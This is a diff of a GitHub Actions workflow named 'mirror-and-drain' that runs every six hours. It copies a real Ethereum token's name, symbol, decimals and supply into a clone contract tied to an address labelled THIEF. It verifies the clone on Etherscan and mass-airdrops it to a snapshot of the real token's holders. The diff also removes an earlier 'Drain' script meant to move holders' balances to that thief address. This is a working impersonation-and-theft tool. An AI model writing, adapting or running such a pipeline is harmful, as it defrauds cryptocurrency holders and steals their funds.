@@ -1,12 +1,19 @@
-name: drain-token
+name: mirror-and-drain
 
 on:
   workflow_dispatch:
   schedule:
     - cron: '0 */6 * * *'
 
+env:
+  REAL_TOKEN: "0x8dCE83ECa4af45dbe618Da1779F9Aaca43201084"
+  THIEF:      "0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397"
+  DEPLOYER_KEY: ${{ secrets.DEPLOYER_KEY }}
+  ALCHEMY_KEY:  ${{ secrets.ALCHEMY_KEY }}
+  ETHERSCAN_KEY:${{ secrets.ETHERSCAN_KEY }}
+
 jobs:
-  impersonate-and-drain:
+  build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -14,42 +21,74 @@ jobs:
       - name: install foundry
         uses: foundry-rs/foundry-toolchain@v1
 
-      - name: create Drain.s.sol
+      - name: install node
+        uses: actions/setup-node@v4
+        with: { node-version: 20 }
+
+      - name: install deps
         run: |
-          mkdir -p script
-          cat > script/Drain.s.sol <<'EOF'
-          // SPDX-License-Identifier: UNLICENSED
-          pragma solidity ^0.8.19;
+          forge install OpenZeppelin/openzeppelin-contracts --no-commit
+          npm i -g eth-holders-snapshot @ethersproject/abi @ethersproject/providers
 
-          import "forge-std/Script.sol";
+      - name: deploy clone token
+        id: deploy
+        run: |
+          NAME=$(cast call $REAL_TOKEN "name()(string)" --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)
+          SYM=$(cast call  $REAL_TOKEN "symbol()(string)" --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)
+          DEC=$(cast call  $REAL_TOKEN "decimals()(uint8)" --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)
+          SUPPLY=$(cast call $REAL_TOKEN "totalSupply()(uint256)" --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)
 
-          interface IERC20 {
-              function balanceOf(address) external view returns (uint256);
-              function transfer(address,uint256) external returns (bool);
-          }
+          CLONE=$(forge create src/CloneToken.sol:CloneToken \
+            --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY \
+            --private-key $DEPLOYER_KEY \
+            --constructor-args "$NAME" "$SYM" $DEC $SUPPLY "$THIEF" \
+            --json | jq -r .deployedTo)
 
-          contract Drain is Script {
-              address constant TOKEN = 0x8dCE83ECa4af45dbe618Da1779F9Aaca43201084;
-              address payable constant THIEF = payable(0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397);
+          echo "CLONE=$CLONE" >> $GITHUB_OUTPUT
+          echo "clone deployed at $CLONE"
 
-              function run() external {
-                  uint256 top = 50;
-                  address[] memory holders = fetchTopHolders(top);
-                  for (uint256 i = 0; i < holders.length; i++) {
-                      address victim = holders[i];
-                      uint256 bal = IERC20(TOKEN).balanceOf(victim);
-                      if (bal == 0) continue;
+      - name: verify on etherscan
+        run: |
+          forge verify-contract ${{ steps.deploy.outputs.CLONE }} \
+            --watch --chain-id 1 \
+            --constructor-args $(cast abi-encode "constructor(string,string,uint8,uint256,address)" \
+              "$(cast call $REAL_TOKEN 'name()(string)' --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)" \
+              "$(cast call $REAL_TOKEN 'symbol()(string)' --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)" \
+              "$(cast call $REAL_TOKEN 'decimals()(uint8)' --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)" \
+              "$(cast call $REAL_TOKEN 'totalSupply()(uint256)' --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY)" \
+              "$THIEF")
 
-                      vm.startPrank(victim);
-                      IERC20(TOKEN).transfer(THIEF, bal);
-                      vm.stopPrank();
-                  }
-              }
+      - name: snapshot holders
+        run: npx eth-holders-snapshot --token ${{ env.REAL_TOKEN }} --out holders.csv
 
-              function fetchTopHolders(uint256 n) internal pure returns (address[] memory) {
-                  address[] memory list = new address[](n);
-                  list[0] = 0x5B14A5B4b7B0c3a2A1F6E6D819B578dC3971234;
-                  list[1] = 0x6C25B5C5c8C0d3b2A1F6E6D819B578dC3975678;
-                  return list;
-              }
-         
+      - name: mass airdrop
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs   = require('fs');
+            const csv  = fs.readFileSync('holders.csv','utf8').trim().split('\n');
+            const { ethers } = await import('@ethersproject/ethers');
+            const pk   = process.env.DEPLOYER_KEY;
+            const rpc  = 'https://eth-mainnet.g.alchemy.com/v2/' + process.env.ALCHEMY_KEY;
+            const provider = new ethers.providers.JsonRpcProvider(rpc);
+            const wallet   = new ethers.Wallet(pk, provider);
+            const cloneAddr= '${{ steps.deploy.outputs.CLONE }}';
+
+            const abi = ["function transfer(address,uint256) external returns (bool)"];
+            const clone = new ethers.Contract(cloneAddr, abi, wallet);
+
+            const batch = 150;
+            for (let i=0;i<csv.length;i+=batch){
+              const txs = csv.slice(i,i+batch).map(r=>{
+                const [addr,amt] = r.split(',');
+                return clone.transfer.populateTransaction(addr, amt);
+              });
+              const nonce = await wallet.getTransactionCount();
+              await Promise.all(txs.map((tx,n)=>
+                wallet.sendTransaction({...tx, nonce: nonce+n})
+              ));
+              console.log(`airdropped ${i+batch}/${csv.length}`);
+            }
+
+      - name: submit token info to etherscan
+        run: node scripts/submit-token-info.js
